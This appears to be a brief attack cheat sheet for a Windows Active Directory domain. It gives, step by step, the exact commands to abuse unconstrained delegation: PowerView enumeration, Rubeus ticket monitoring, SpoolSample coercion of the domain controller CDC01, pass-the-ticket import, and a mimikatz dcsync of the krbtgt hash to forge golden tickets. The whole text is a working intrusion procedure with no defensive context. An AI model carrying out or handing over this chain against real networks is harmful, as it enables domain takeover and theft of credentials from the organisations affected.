**IMPORTANT NOTE:** ALL THIS HAVE TO BE PERFORMED FROM A POWERSHELL SESSION

1st Enumeration with PowerView
	
 ```Get-DomainComputer -Unconstrained```

2nd Monitoring with Rubeus for a TGT of the CDC01$ computer account
	
```Rubeus.exe monitor /interval:5 /filteruser:CDC01$```

3rd Coerce authentication with SpoolSample of CDC01 to APPSRV01
	
 ```SpoolSample.exe CDC01 APPSRV01```
	
4th The import the recieved TGT with Rubeus
	
 ```Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...```

5th(mimikatz) Since CDC01$ is not a local administrator account on the domain controller we cannot perform direct lateral movement, instead we will perform dcsync to dump the krbtgt NTLM hash to create golden tikcets
	
 ```lsadump::dcsync /domain:contoso.com /user:contoso\krbtgt```
